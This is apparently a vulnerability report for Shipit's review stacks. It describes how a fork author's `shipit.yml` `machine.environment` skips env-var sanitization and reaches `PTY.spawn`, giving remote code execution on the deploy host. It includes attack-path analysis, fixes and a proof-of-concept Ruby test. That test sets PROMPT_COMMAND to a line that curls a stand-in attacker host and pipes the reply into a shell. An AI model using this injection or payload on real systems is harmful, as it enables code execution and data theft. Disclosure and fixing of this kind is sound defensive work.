### Title
Unsanitized `shipit.yml` `machine.environment` in ReviewStack tasks reaches `PTY.spawn`, allowing an attacker-controlled fork commit to set `PROMPT_COMMAND` (and any other env var) - (File: `lib/shipit/task_commands.rb`)

### Summary
`TaskCommands#env` merges `deploy_spec.machine_env` (parsed straight from the `shipit.yml`/`.shipit/*.yml` file checked out at the task's commit) into the environment hash with no whitelist filtering, unlike the `env` parameter path which is sanitized by `EnvironmentVariables#permit`. For a `ReviewStack`, the checked-out commit is the PR's head commit, which an unprivileged fork author fully controls, so they can set `machine.environment.PROMPT_COMMAND` (or `LD_PRELOAD`, `BASH_ENV`, etc.) in their own `shipit.yml`, and that value flows unfiltered into `Command#unbundled_env` and then `PTY.spawn`.

### Finding Description
The broken binding: the set of environment keys allowed to reach `PTY.spawn` for a task is claimed to equal `EnvironmentVariables.permit(variable_definitions)` output (a whitelist), but in reality it equals `stack.env ∪ task-derived vars ∪ deploy_spec.machine_env ∪ task.env`, where `deploy_spec.machine_env` is **not** passed through `EnvironmentVariables#permit` at all.

- `deploy_spec.machine_env` is defined as `config('machine', 'environment') || {}` [1](#0-0)  and `config` reads directly from the parsed `shipit.yml` file discovered on disk [2](#0-1) .
- `TaskCommands#env` merges this value directly into the task's environment with no sanitation step, in contrast to `filter_deploy_envs`/`filter_task_envs`, which explicitly call `EnvironmentVariables.with(env).permit(...)`: [3](#0-2) 
- `EnvironmentVariables#permit` is the only sanitation mechanism in the codebase, and it is invoked solely on the user-supplied `env` param for deploys/rollbacks/tasks, never on `machine_env`: [4](#0-3) [5](#0-4) [6](#0-5) 
- The resulting `Command#env` is merged unfiltered into `unbundled_env` and passed straight to `PTY.spawn`: [7](#0-6) 

For a `ReviewStack`, `#env` also merges every PR label (uppercased) into the environment unfiltered [8](#0-7) , confirmed by `test/lib/shipit/task_commands_test.rb` which shows PR labels flow straight into task env without any whitelist check.

Attack path: an unprivileged user opens a PR from their own fork against a repository configured with `provisioning_behavior: allow_all` and `review_stacks_enabled: true`. `OpenedHandler#provision?` reaches the `allow_all` branch unconditionally regardless of labels/permissions [9](#0-8) , creating a `ReviewStack` whose `branch` is `pull_request.head.ref` [10](#0-9) . The stack's task execution then clones/fetches the code and checks it out; `DeploySpec::FileSystem` discovers and loads whichever `shipit.yml`/`.shipit/shipit.yml` exists in that checkout at the head commit — content the fork PR author fully controls. Placing `machine: { environment: { PROMPT_COMMAND: '<attacker command>;' } }` in that file causes it to be merged unfiltered into every subsequent `Command`'s env for that stack's tasks (install_dependencies, deploy steps, etc.), reaching `PTY.spawn`.

Existing guards fail to close this: `EnvironmentVariables#permit` only governs the user-submitted `env` request parameter (deploy/rollback/task API), not `machine_env`; there is no repository-owner-only trust boundary enforced on `shipit.yml` content for review stacks; `provision?`'s `allow_all` behavior is explicitly documented as "ALL Pull Requests dynamically provision stacks" with no authorization check on the PR author.

### Impact Explanation
Any environment variable defined by an attacker's fork-side `shipit.yml` (or PR label, if the attacker has label-adding permission) is injected into the environment of every `Command` spawned for that review stack's deploy/rollback/task steps, including `PATH`, and reaches `PTY.spawn` unfiltered. Setting variables like `BASH_ENV`, `LD_PRELOAD`, `PROMPT_COMMAND`, or overriding tool-specific env vars used by the deploy/build tooling gives the attacker code execution in the context of whatever shell/binary is invoked by the deploy steps on the Shipit deploy host — this is Remote Code Execution on the deploy host, matching the Critical impact category. Blast radius is scoped to the review stack's own deploy environment/host resources, but is repeatable on every PR the attacker opens against any repository configured with `allow_all` review stacks.

### Likelihood Explanation
Preconditions: the target repository must have `review_stacks_enabled = true` and `provisioning_behavior = allow_all` (an explicitly offered, documented configuration — the settings UI even recommends "Allow All" as the likely choice). Given that configuration, the attacker needs only to open a PR from their own fork containing a modified `shipit.yml`; no Shipit credentials, GitHub write access, or secrets are required. This is low-cost and fully repeatable. The PR-label vector is weaker in practice since adding labels typically requires GitHub triage/write permission, which most external fork contributors lack — the primary, always-available vector is the fork's own `shipit.yml` `machine.environment`.

### Recommendation
Do not trust `machine.environment` (or PR labels) from PR-controlled `shipit.yml` content for review stacks without sanitization. Either: (1) route `deploy_spec.machine_env` and `ReviewStack#env`'s label-derived variables through `EnvironmentVariables#permit` against an explicit, repository-maintainer-controlled whitelist before merging into `TaskCommands#env`; (2) for review stacks, source `machine.environment`/deploy configuration from the base branch's `shipit.yml` rather than the PR head commit, treating only the deploy *steps* (not machine-level env) as fork-controllable; or (3) apply a deny-list/allow-list at the `Command#unbundled_env` layer that strips dangerous shell-influencing variables (`PROMPT_COMMAND`, `BASH_ENV`, `LD_PRELOAD`, `IFS`, etc.) regardless of source.

### Proof of Concept
```ruby
# test/lib/shipit/task_commands_test.rb
test "#env does not allow machine_env from an untrusted shipit.yml to inject PROMPT_COMMAND" do
  stack = shipit_stacks(:review_stack)
  task = shipit_tasks(:shipit_restart)
  task.stack = stack

  # Simulate an attacker-controlled shipit.yml checked out at the PR head commit
  deploy_spec = Shipit::DeploySpec.new(
    "machine" => { "environment" => { "PROMPT_COMMAND" => "curl attacker.example/$(whoami) | sh" } }
  )
  Shipit::TaskCommands.any_instance.stubs(:deploy_spec).returns(deploy_spec)

  env = Shipit::TaskCommands.new(task).env

  # Binding under test: no fork-controllable key should reach the environment hash
  # LHS (claimed invariant): env.keys & deploy_spec.machine_env.keys == []
  # RHS (observed):          env.keys & deploy_spec.machine_env.keys == ["PROMPT_COMMAND"]
  assert_not_includes env.keys, "PROMPT_COMMAND",
    "machine_env from an untrusted shipit.yml must not reach the spawned command's environment"
end
```
This test is expected to **fail** against the current code, demonstrating that `TaskCommands#env` (and by extension `Command#unbundled_env` / `PTY.spawn`) admits `PROMPT_COMMAND` from `deploy_spec.machine_env` with no filtering, confirming the vulnerability.
